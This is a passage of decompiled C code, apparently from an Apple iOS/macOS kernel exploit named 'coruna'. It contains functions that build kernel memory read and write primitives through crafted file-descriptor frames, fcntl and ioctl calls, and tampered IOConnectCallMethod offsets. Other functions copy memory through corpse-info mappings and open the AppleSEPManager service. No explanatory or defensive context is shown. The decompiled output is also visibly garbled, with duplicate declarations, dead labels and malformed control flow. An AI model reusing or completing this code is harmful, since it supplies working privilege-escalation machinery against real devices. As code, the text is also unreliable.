            _free(pp_Var5);
            break;
          }
          *ptr = id_2;
          *(mach_port_t *)(ptr + 1) = thread;
          *(bool *)((long)ptr + 0xc) = err;
          lppv7 = (void **)coruna_fn_ptr_cast(coruna_thread_depress_abort);
          err = _pthread_create_suspended_np(pp_Var12,&bootargs,lppv7,ptr);
          if (err != 0) {
            _free(pp_Var5);
            break;
          }
          _pthread_attr_destroy(&bootargs);
          target_act = _pthread_mach_thread_np(*pp_Var12);
          if (((target_act + 1 < 2) || (err = coruna_mach_timebase_info(target_act,size), err == 0)) ||
             (lk4 = _thread_resume(target_act), lk4 != 0)) {
            _free(pp_Var5);
            break;
          }
          version = version - 1;
          pp_Var12 = pp_Var12 + 1;
        } while (version != 0);
        if (version == 0) {
          *val = pp_Var5;
          *size = flags - 1U;
          u = 1;
        }
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail(u);
  }
  return;
}





uint64_t coruna_slot_clear(long handle,uint size)
{
  uint64_t u;
  
  u = 0xad008;
  if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
    if (0x3f < size) {
      return 0x28011;
    }
    u = 0;
    *(uint32_t *)(*(long *)(handle + 0x118) + (unsigned long)size) = 0;
  }
  return u;
}





uint64_t coruna_mach_absolute_time_1b5b4(long handle,uint size,uint flags_2)
{
  byte err;
  unsigned long u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  long handle;
  
  port = 0xad008;
  handle = *(long *)(handle + 0x118);
  if ((handle != 0) && (*(long *)(handle + 0x120) != 0)) {
    if (size < 0x40) {
      size = _mach_absolute_time();
      LOAcquire();
      err = *(byte *)(handle + (unsigned long)size);
      *(byte *)(handle + (unsigned long)size) = 1;
      LORelease();
      if ((err & 1) != 0) {
        do {
          if (flags_2 != 0) {
            version = _mach_absolute_time();
            u = 0;
            if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
              u = ((version - size) * (unsigned long)*(uint *)(handle + 0x25c)) /
                      (unsigned long)*(uint *)(handle + 0x260);
            }
            if ((unsigned long)flags_2 < u / 1000000) {
              return 0xad020;
            }
          }
          _thread_switch(0,2,1);
          LOAcquire();
          err = *(byte *)(handle + (unsigned long)size);
          *(byte *)(handle + (unsigned long)size) = 1;
          LORelease();
        } while ((err & 1) != 0);
      }
      port = 0;
    }
    else {
      port = 0x28011;
    }
  }
  return port;
}





uint coruna_close(int flags)
{
  uint u;
  int err;
  int *err;
  uint *ptr;
  
  err = _close(flags);
  u = 0;
  if (err != 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_open_dev_null(int *flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  err = _open("/dev/null",0x20);
  if (err < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    *flags = err;
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_fd_read_full(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  long handle;
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  uint32_t host_info;
  uint32_t scratch;
  uint32_t serial_buf;
  uint32_t bootargs;
  long action;
  uint32_t block_ctx;
  
  u = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kernel29bb0_residual_161(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((u = coruna_open_dev_null(&block_ctx), (int)u == 0 &&
        (u = coruna_fd_drain(ptr), (int)u == 0)))) {
      scratch = 0;
      serial_buf = 0;
      bootargs = 0x10000000;
      host_info = size;
      action = addr_2;
      u = coruna_write(ptr,&host_info,0x18);
      if (((int)u == 0) && (u = coruna_fd_read_full(ptr,&scratch,0x18), (int)u == 0)) {
        if ((coruna_u64_pack((scratch), (host_info)) == scratch && coruna_u64_pack((bootargs), (serial_buf)) == bootargs)
            && action == thread_attr) {
          u = coruna_fd_read_full(&k_kernel_slot_1938 + handle,val,size);
        }
        else {
          u = 0xad014;
        }
      }
      if (flags == 0) {
        return u;
      }
    }
    coruna_close(block_ctx);
  }
  return u;
}
uint64_t coruna_kernel29bb0_via_write(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  long handle;
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint32_t block_ctx;
  
  u = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kernel29bb0_residual_161(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((u = coruna_open_dev_null(&block_ctx), (int)u == 0 &&
        (u = coruna_fd_drain(ptr), (int)u == 0)))) {
      serial_buf = k_kernel_rodata_word_0002af08;
      host_info = k_kernel_rodata_word_2af00;
      action = addr_2;
      u = coruna_write(ptr,&host_info,0x18);
      if (((int)u == 0) && (u = coruna_fd_read_full(ptr,&scratch,0x18), (int)u == 0)) {
        if ((host_info == scratch && serial_buf == bootargs) && action == thread_attr) {
          u = coruna_write(&k_kernel_slot_1938 + handle,val,size);
        }
        else {
          u = 0xad014;
        }
      }
      if (flags == 0) {
        return u;
      }
    }
    coruna_close(block_ctx);
  }
  return u;
}





void coruna_kernel29bb0_residual_166(long handle,uint64_t *val,long addr_2,uint64_t id_2,int flags)
{
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[2] = k_kernel_rodata_word_2aef0;
  *(uint32_t *)((long)val + 0x1c) = 0;
  if ((flags == 7) && (*(long *)(handle + 0x220) != 0)) {
    val[5] = *(long *)(handle + 0x220);
    val[7] = addr_2 + 0x60;
    val[0xd] = id_2;
  }
  else {
    val[5] = addr_2 + 0x60;
    val[7] = id_2;
    *(int *)(val + 0xc) = flags;
  }
  val[8] = 0;
  *(uint8_t *)((long)val + 0x53) = 0x22;
  val[0xb] = 0;
  return;
}





void coruna_call_mach_vm_machine_attribute_29df8_18d98(void)
{
  coruna_kernel29bb0_via_ioconnectcallmethod_3();
  return;
}





bool coruna_kernel29478_residual_162(long handle)
{
  if (*(long *)(handle + 0x230) != 0) {
    return *(long *)(handle + 0x228) != 0;
  }
  return false;
}





uint64_t coruna_kernel29bb0_via_return_zero_201ac(long handle)
{
  uint32_t u;
  long handle;
  uint64_t size;
  uint8_t scratch[4];
  
  size = 0x2800e;
  u = *(uint32_t *)k_kernel_mach_task_self_slot;
  handle = coruna_call_macho_data_seg_2bb24_2bdb4_20fac(handle,u,scratch);
  if (handle != 0) {
    *(long *)(handle + 0x230) = handle;
    handle = coruna_return_zero_201ac(handle,u);
    if (handle != 0) {
      size = 0;
      *(long *)(handle + 0x228) = handle;
    }
  }
  return size;
}





uint64_t coruna_helper_10384_18e34(void)
{
  return 0;
}





uint64_t coruna_nop_stub(void)
{
  return 0x4000;
}





uint64_t coruna_return_zero_1cf78(long handle)
{
  if (((((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       (*(int *)(&k_kernel_slot_1940 + handle) == -1)) || (*(long *)(handle + 0x218) == 0)) &&
     (((*(int *)(handle + 0xe8) + 1U < 2 || (*(long *)(handle + 0xf8) == 0)) ||
      ((*(long *)(handle + 0x100) == 0 || (0x2711 < *(int *)(handle + 0x140))))))) {
    return 0;
  }
  return 1;
}





unsigned long coruna_fcntl_18eb0(long arg,long val,long n,uint m,int p)

{
  int *idx;
  size_t ls2;
  uint u;
  bool idx;
  int count;
  long base;
  int *i;
  uint *str;
  uint type_id_8;
  uint type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_15;
  size_t ls13;
  unsigned long type_id_12;
  uint32_t region;
  uint8_t plist[160];
  int url_buf [42];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  type_id_12 = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + arg) != -1)) &&
     ((*(long *)(arg + 0x218) != 0 && (base = coruna_kernel29bb0_residual_161(arg), base != 0)))) {
    idx = (int *)(&k_kernel_slot_1930 + arg);
    region = 0xffffffff;
    if ((p == 0) ||
       ((type_id_12 = coruna_open_dev_null(&region), (int)type_id_12 == 0 &&
        (type_id_12 = coruna_fd_drain(idx), (int)type_id_12 == 0)))) {
      type_id_8 = 4;
      if (*(long *)(arg + 0x220) != 0) {
        type_id_8 = 8;
      }
      if (m != 0) {
        type_id_10 = 0;
        do {
          type_id_12 = val + type_id_10;
          u = m - (int)type_id_10;
          if (((((*(unsigned long *)(arg + 0x188) & type_id_12) != 0) || (u < 0x4000)) ||
              (*(long *)(arg + 0x230) == 0)) || (*(long *)(arg + 0x228) == 0)) {
            if (type_id_8 < u || type_id_8 - u == 0) {
              type_id_15 = 0;
            }
            else {
              type_id_9 = 0;
              if ((((type_id_12 - 1) + (unsigned long)u ^ (type_id_12 - 1) + (unsigned long)type_id_8) &
                  (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
                type_id_9 = type_id_8 - u;
              }
              type_id_15 = (unsigned long)type_id_9;
            }
            type_id_9 = type_id_8;
            if (*(long *)(arg + 0x220) == 0) {
              type_id_12 = coruna_kernel29bb0_via_fd_read_full_2(arg,type_id_12 - type_id_15);
              if ((int)type_id_12 == 0) {
                i = ___error();
                *i = 0;
                count = _fcntl(*(int *)(&k_kernel_slot_1940 + arg),5);
                url_buf[0] = count;
                if ((count == -1) && (i = ___error(), *i != 0)) {
found:
                  i = ___error();
                  count = *i;
                  str = (uint *)___error();
                  u = -*str;
                  if (-1 < count) {
                    u = *str;
                  }
                  type_id_12 = (unsigned long)(u | 0x40000000);
                }
                else {
                  idx = 3 < u;
                  ls13 = 4;
nomem:
                  ls2 = (unsigned long)u;
                  if (idx) {
                    ls2 = ls13;
                  }
                  _memcpy((void *)(n + type_id_10),(void *)((long)url_buf + type_id_15),ls2);
                  type_id_12 = 0;
                }
                continue;
              }
            }
            else if (((*idx == -1) || (*(int *)(&k_kernel_slot_1934 + arg) == -1)) ||
                    (*(long *)(arg + 0x218) == 0)) {
              type_id_12 = 0xad001;
            }
            else {
              url_buf[0x22] = 0;
              url_buf[0x23] = 0;
              url_buf[0x20] = 0;
              url_buf[0x21] = 0;
              url_buf[0x26] = 0;
              url_buf[0x27] = 0;
              url_buf[0x24] = 0;
              url_buf[0x25] = 0;
              url_buf[0x1a] = 0;
              url_buf[0x1b] = 0;
              url_buf[0x18] = 0;
              url_buf[0x19] = 0;
              url_buf[0x1e] = 0;
              url_buf[0x1f] = 0;
              url_buf[0x1c] = 0;
              url_buf[0x1d] = 0;
              url_buf[0x12] = 0;
              url_buf[0x13] = 0;
              url_buf[0x10] = 0;
              url_buf[0x11] = 0;
              url_buf[0x16] = 0;
              url_buf[0x17] = 0;
              url_buf[0x14] = 0;
              url_buf[0x15] = 0;
              url_buf[10] = 0;
              url_buf[0xb] = 0;
              url_buf[8] = 0;
              url_buf[9] = 0;
              url_buf[0xe] = 0;
              url_buf[0xf] = 0;
              url_buf[0xc] = 0;
              url_buf[0xd] = 0;
              url_buf[2] = 0;
              url_buf[3] = 0;
              url_buf[0] = 0;
              url_buf[1] = 0;
              url_buf[6] = 0;
              url_buf[7] = 0;
              url_buf[4] = 0;
              url_buf[5] = 0;
              coruna_kernel29bb0_residual_166(arg,url_buf,*(long *)(arg + 0x218),(type_id_12 - type_id_15) + -0x48,7)
              ;
              type_id_12 = coruna_write(idx,url_buf,0xa0);
              if (((int)type_id_12 == 0) &&
                 (type_id_12 = coruna_fd_read_full(idx,plist,0xa0), (int)type_id_12 == 0)) {
                count = _memcmp(url_buf,plist,0xa0);
                if (count == 0) {
                  count = _ioctl(*(int *)(&k_kernel_slot_1940 + arg),0x40087367);
                  if (count != 0) goto found;
                  idx = 7 < u;
                  ls13 = 8;
                  goto nomem;
                }
                type_id_12 = 0xad014;
              }
            }
again:
            coruna_kernel29bb0_via_fd_read_full_3(arg);
            if (*(long *)k_kernel_stack_chk_guard_slot != action) {
            ___stack_chk_fail();
            }
            return type_id_12;
          }
          type_id_12 = coruna_task_map_corpse_info_64(arg,type_id_12,n + type_id_10);
          type_id_9 = 0x4000;
invalid:
          continue;
        } while (type_id_9 < m);
      }
      type_id_12 = coruna_kernel29bb0_via_fd_read_full_3(arg);
exit_ok:
      if (*(long *)k_kernel_stack_chk_guard_slot != action) {
      ___stack_chk_fail();
      }
      return type_id_12;
    }
    coruna_close(region);
  }
parse_ok:
  if (*(long *)k_kernel_stack_chk_guard_slot != action) {
    ___stack_chk_fail();
  }
  return type_id_12;
}





uint coruna_task_map_corpse_info_64(long handle,uint64_t val,void *ctx)
{
  int err;
  uint u;
  uint64_t size;
  uint64_t version;
  uint port;
  uint64_t scratch;
  long bootargs;
  mach_vm_size_t thread_attr;
  void *host_info;
  uint64_t scratch;
  
  port = 0xad001;
  host_info = (void *)0x0;
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  if (*(long *)(handle + 0x230) == 0) {
    return 0xad001;
  }
  if (*(long *)(handle + 0x228) == 0) {
    return 0xad001;
  }
  scratch = val;
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 || (*(long *)(handle + 0x218) == 0))))
    if ((host_info != (void *)0x0) && (thread_attr != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
    thread_attr);
    }
    return port;
  }
  else {
    if (*(long *)(handle + 0xf0) == 0) {
      port = 0xad009;
      if ((host_info != (void *)0x0) && (thread_attr != 0)) {
      _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
      thread_attr);
      }
      return port;
    }
    bootargs = *(long *)(handle + 0xf0) + 0x100;
  }
  err = coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(handle,bootargs + 8,&scratch,*(uint32_t *)(handle + 0x168),0);
  port = 0x28010;
  if (err != 0) {
    size = *(uint64_t *)(handle + 0x228);
    err = coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(handle,size,&bootargs,*(uint32_t *)(handle + 0x168),0);
    if (err != 0) {
      version = *(uint64_t *)(handle + 0x230);
      err = coruna_kernel29bb0_via_ioconnectcallmethod_3(handle,version,4,(long)&scratch + 4,0);
      port = 0x2800f;
      u = port;
      if (err != 0) {
        scratch = coruna_u64_pack((scratch), (scratch)) | 0x20;
        err = coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(handle,version,&scratch,4,0);
        u = 0x28010;
        if (err != 0) {
          u = _task_map_corpse_info_64
                            (*(uint32_t *)k_kernel_mach_task_self_slot,
                             *(uint32_t *)k_kernel_mach_task_self_slot,&host_info,&thread_attr);
          if (u == 0) {
            if ((host_info != (void *)0x0) && (thread_attr == 0x4000)) {
              _memcpy(ctx,host_info,0x4000);
              port = 0;
            }
          }
          else {
            port = u | 0x80000000;
          }
          err = coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(handle,version,(long)&scratch + 4,4,0);
          u = port;
          if ((err == 0) && (u = 0x28010, port != 0)) {
            u = port;
          }
        }
      }
      bootargs = 0;
      err = coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(handle,size,&bootargs,*(uint32_t *)(handle + 0x168),0);
      port = u;
      if ((err == 0) && (port = 0x28010, u != 0)) {
        port = u;
      }
    }
  }
fail:
  if ((host_info != (void *)0x0) && (thread_attr != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)host_info,
                        thread_attr);
  }
  return port;
}





unsigned long coruna_kernel29bb0_via_fd_read_full_2(long arg,long val)

{
  uint port;
  int err;
  unsigned long u;
  uint8_t json_buf[160];
  uint64_t frame;
  uint64_t scratch;
  uint64_t work;
  uint64_t bootargs;
  uint64_t cache;
  long cache_20;
  uint64_t thread_attr;
  long cache_21;
  uint64_t cache_22;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t cache_23;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t stack_guard;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0xad001;
  if (((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
     (*(long *)(arg + 0x218) != 0)) {
    cache = 0;
    thread_attr = 0;
    cache_21 = val + -0x60;
    sa_new = 0;
    stack_guard = 0;
    tmp_buf = 0;
    path_buf = 0;
    block_ctx = 0;
    sa_saved = 0;
    stack_guard = 0;
    host_info = 0;
    cache_22 = 0;
    action = 0;
    scratch = 0;
    frame = 0;
    bootargs = 0;
    work = k_kernel_rodata_word_2aef0;
    cache_20 = *(long *)(arg + 0x218) + 0x60;
    cache_23 = 2;
    serial_buf = 0x22000000;
    u = coruna_write(&k_kernel_slot_1930 + arg,&frame,0xa0);
    if (((int)u == 0) &&
       (u = coruna_fd_read_full(&k_kernel_slot_1930 + arg,json_buf,0xa0), (int)u == 0)) {
      err = _memcmp(&frame,json_buf,0xa0);
      port = 0;
      if (err != 0) {
        port = 0xad014;
      }
      u = (unsigned long)port;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail();
  }
  return u;
}





unsigned long coruna_kernel29bb0_via_fd_read_full_3(long arg)

{
  uint port;
  int err;
  unsigned long u;
  uint8_t json_buf[160];
  uint64_t frame;
  uint64_t scratch;
  uint64_t work;
  uint64_t bootargs;
  uint64_t cache;
  long cache_20;
  uint64_t thread_attr;
  uint64_t region;
  uint64_t cache_22;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t cache_23;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t stack_guard;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0xad001;
  if (((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
     (*(long *)(arg + 0x218) != 0)) {
    sa_new = 0;
    stack_guard = 0;
    tmp_buf = 0;
    path_buf = 0;
    block_ctx = 0;
    sa_saved = 0;
    stack_guard = 0;
    host_info = 0;
    cache_22 = 0;
    action = 0;
    cache = 0;
    region = 0;
    thread_attr = 0;
    scratch = 0;
    frame = 0;
    bootargs = 0;
    work = k_kernel_rodata_word_2aef0;
    cache_20 = *(long *)(arg + 0x218) + 0x60;
    cache_23 = 3;
    serial_buf = 0x22000000;
    u = coruna_write(&k_kernel_slot_1930 + arg,&frame,0xa0);
    if (((int)u == 0) &&
       (u = coruna_fd_read_full(&k_kernel_slot_1930 + arg,json_buf,0xa0), (int)u == 0)) {
      err = _memcmp(&frame,json_buf,0xa0);
      port = 0;
      if (err != 0) {
        port = 0xad014;
      }
      u = (unsigned long)port;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail();
  }
  return u;
}





unsigned long coruna_fcntl_1c910(long arg,long val,long n,uint m,int p)

{
  unsigned long port;
  uint tag;
  int status;
  long addr;
  int *j;
  uint *buf;
  unsigned long type_id;
  uint version;
  uint type_id_8;
  uint32_t scratch;
  uint32_t cache_24;
  
  type_id = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + arg) != -1) && (*(int *)(&k_kernel_slot_1934 + arg) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + arg) != -1)) &&
     ((*(long *)(arg + 0x218) != 0 && (addr = coruna_kernel29bb0_residual_161(arg), addr != 0)))) {
    cache_24 = 0xffffffff;
    if ((p == 0) ||
       ((type_id = coruna_open_dev_null(&cache_24), (int)type_id == 0 &&
        (type_id = coruna_fd_drain(&k_kernel_slot_1930 + arg), (int)type_id == 0)))) {
      if (m != 0) {
        version = 0;
        do {
          tag = m - version;
          scratch = 0;
          addr = val + (unsigned long)version;
          if (tag < 4) {
            type_id_8 = 0;
            if ((((addr + (unsigned long)tag) - 1 ^ addr + 3U) &
                (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
              type_id_8 = 4 - tag;
            }
          }
          else {
            type_id_8 = 0;
          }
          port = 4 - (unsigned long)type_id_8;
          if ((unsigned long)tag <= 4 - (unsigned long)type_id_8) {
            port = (unsigned long)tag;
          }
          if (((port < 4) &&
              (type_id = coruna_fcntl_18eb0(arg,addr - (unsigned long)type_id_8,&scratch,4,0), (int)type_id != 0))
             || (type_id = coruna_kernel29bb0_via_fd_read_full_2(arg,addr - (unsigned long)type_id_8), (int)type_id != 0)) {
load_ok:
            coruna_kernel29bb0_via_fd_read_full_3(arg);
            goto load_ok_15;
          }
          _memcpy((void *)((long)&scratch + (unsigned long)type_id_8),(void *)(n + (unsigned long)version),port);
          if (*(long *)(arg + 0x220) == 0) {
            status = _fcntl(*(int *)(&k_kernel_slot_1940 + arg),6);
          }
          else {
            status = _ioctl(*(int *)(&k_kernel_slot_1940 + arg),0x8004667c);
          }
          if (status != 0) {
            j = ___error();
            status = *j;
            buf = (uint *)___error();
            version = -*buf;
            if (-1 < status) {
              version = *buf;
            }
            type_id = (unsigned long)(version | 0x40000000);
            goto load_ok;
          }
          version = (version - type_id_8) + 4;
        } while (version < m);
      }
      type_id = coruna_kernel29bb0_via_fd_read_full_3(arg);
load_ok_15:
      if (p == 0) {
        return type_id;
      }
    }
    coruna_close(cache_24);
  }
  return type_id;
}





uint64_t coruna_semaphore_destroy(long handle,int flags)
{
  pthread_t p_Var1;
  long *ptr;
  
  ptr = *(long **)(handle + 0x28);
  if (ptr != (long *)0x0) {
    *(uint8_t *)(handle + 0xc) = 0;
    *(uint64_t *)(handle + 0x28) = 0;
    p_Var1 = (pthread_t)*ptr;
    if (p_Var1 != (pthread_t)0x0) {
      if (1 < *(semaphore_t *)(ptr + 1) + 1 && flags != 0) {
        *(uint8_t *)(ptr + 7) = 1;
        _semaphore_signal(*(semaphore_t *)(ptr + 1));
        p_Var1 = (pthread_t)*ptr;
      }
      _pthread_join(p_Var1,(void **)0x0);
      *ptr = 0;
    }
    if (1 < *(semaphore_t *)(ptr + 1) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(ptr + 1));
      *(uint32_t *)(ptr + 1) = 0;
    }
    if (1 < *(semaphore_t *)((long)ptr + 0xc) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,
                         *(semaphore_t *)((long)ptr + 0xc));
      *(uint32_t *)((long)ptr + 0xc) = 0;
    }
    if ((int)ptr[2] != -1) {
      _close((int)ptr[2]);
      *(uint32_t *)(ptr + 2) = 0xffffffff;
    }
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    _free(ptr);
  }
  return 0;
}





uint8_t * coruna_open_sepmgr(long handle)
{
  uint u;
  int err;
  uint64_t *ptr;
  uint8_t *buf;
  unsigned long size;
  bool err;
  uint64_t scratch;
  semaphore_t bootargs [2];
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    if (*(char *)(handle + 0xc) != '\0') {
      return (uint8_t *)0x0;
    }
    size = (unsigned long)*(uint *)(handle + 0x10);
    if (*(uint *)(handle + 0x10) + 1 < 2) {
      size = coruna_ioservicegetmatchingservice("AppleSEPManager");
      if ((int)size + 1U < 2) {
        return (uint8_t *)0xad011;
      }
      *(int *)(handle + 0x10) = (int)size;
    }
    buf = k_kernel_mach_task_self_slot;
    err = false;
    while (u = __IOServiceSetAuthorizationID(size,0), u == 0xe00002c1) {
      return (uint8_t *)(unsigned long)(u & 0xfff | 0x70000000);
    }
    if (u != 0) {
fail:
      return (uint8_t *)(unsigned long)(u & 0xfff | 0x70000000);
    }
done:
    *(uint8_t *)(handle + 0xc) = 1;
    return (uint8_t *)0x0;
  }
  scratch = 0;
  bootargs[0] = 0;
  bootargs[1] = 0;
  if (*(char *)(handle + 0xc) != '\0') {
    return (uint8_t *)0x0;
  }
  ptr = _calloc(1,0x40);
  if (ptr == (uint64_t *)0x0) {
    return (uint8_t *)0xad009;
  }
  *(uint32_t *)(ptr + 2) = 0xffffffff;
  *(uint64_t **)(handle + 0x28) = ptr;
  buf = k_kernel_mach_task_self_slot;
  u = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,bootargs + 1,0,0);
  if (u == 0) {
    *(semaphore_t *)(ptr + 1) = bootargs[1];
    u = _semaphore_create(*(task_t *)buf,bootargs,0,0);
    if (u == 0) {
      *(semaphore_t *)((long)ptr + 0xc) = bootargs[0];
      buf = (uint8_t *)coruna_pthread_attr_setdetachstate_2e9c4(handle,&scratch,coruna_connect_setsockopt,handle);
      coruna_semaphore_destroy(handle,0);
      return buf;
    }
  }
  buf = (uint8_t *)(unsigned long)(u | 0x80000000);
cleanup:
  coruna_semaphore_destroy(handle,0);
  return buf;
}





unsigned long coruna_ioconnectcallmethod(long arg,long val,long n,uint m,int p)

{
  unsigned long port;
  long *copy;
  long serial_11;
  uint size;
  uint kind;
  long base;
  int idx;
  unsigned long version;
  uint type_id_8;
  unsigned long type_id_9;
  uint64_t type_id_10;
  uint type_id_15;
  size_t ls13;
  long serial_12;
  uint32_t cache_22;
  uint32_t cache_25;
  uint64_t cache_26;
  uint32_t cache_27;
  uint32_t plist;
  uint64_t cache_28;
  uint64_t url_buf;
  unsigned long action [3];
  
  action[2] = *(unsigned long *)k_kernel_stack_chk_guard_slot;
  type_id_9 = 0xad001;
  if (((((1 < *(int *)(arg + 0xe8) + 1U) && (*(long *)(arg + 0xf8) != 0)) &&
       (*(long *)(arg + 0x100) != 0)) && (base = coruna_kernel29bb0_residual_161(arg), base != 0)) &&
     ((cache_25 = 0xffffffff, p == 0 || (type_id_9 = coruna_open_dev_null(&cache_25), (int)type_id_9 == 0)))
     ) {
    if (m != 0) {
      version = 0;
      do {
        port = val + version;
        size = m - (int)version;
        ls13 = (size_t)size;
        if (((*(unsigned long *)(arg + 0x188) & port) == 0) && (0x3fff < size)) {
          if ((*(long *)(arg + 0x230) == 0) || (*(long *)(arg + 0x228) == 0)) {
            type_id_15 = 0;
            goto load_ok_16;
          }
          type_id_9 = coruna_task_map_corpse_info_64(arg,port,n + version);
          idx = 0x4000;
        }
        else {
          kind = 0;
          if ((((port + ls13) - 1 ^ port + 3) &
              (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
            kind = 4 - size;
          }
          type_id_15 = 0;
          if (size < 4) {
            type_id_15 = kind;
          }
load_ok_16:
          idx = *(int *)(arg + 0xe8);
          type_id_9 = 0xad001;
          if (1 < idx + 1U) {
            base = *(long *)(arg + 0xf8);
            type_id_9 = 0xad001;
            if (*(int *)(arg + 0x140) < 0x2258) {
              if ((base != 0) && (type_id_9 = 0xad001, *(long *)(arg + 0x100) != 0)) {
                base = *(long *)(arg + 0x108) + base;
                type_id_10 = *(uint64_t *)(base + 0xc0);
                *(unsigned long *)(base + 0xc0) = (port - type_id_15) + -0x14;
                cache_28 = 0;
                cache_26 = coruna_u64_pack((cache_26), (1));
                action[0] = (unsigned long)*(uint *)(arg + 0x110);
                kind = _IOConnectCallMethod(idx,0x10,action,1,0,0,&cache_28,&cache_26,0,0);
                if (kind == 0) {
                  kind = 0;
                  cache_22 = (uint32_t)cache_28;
                }
                else {
                  kind = kind | 0x80000000;
                }
                type_id_8 = 0xad001;
                if ((*(long *)(arg + 0xf8) != 0) &&
                   (type_id_8 = 0xad001, *(long *)(arg + 0x100) != 0)) {
                  type_id_8 = 0;
                  *(uint64_t *)(*(long *)(arg + 0x108) + *(long *)(arg + 0xf8) + 0xc0) =
                       type_id_10;
                }
                goto load_ok_17;
              }
            }
            else if ((base != 0) && (type_id_9 = 0xad001, *(long *)(arg + 0x100) != 0)) {
              serial_12 = 0x450;
              if (*(unsigned long *)(arg + 0x158) < 0x225c192d100000) {
                serial_12 = 0x448;
              }
              copy = (long *)(*(long *)(arg + 0x108) + base + serial_12);
              serial_12 = copy[1];
              base = *copy;
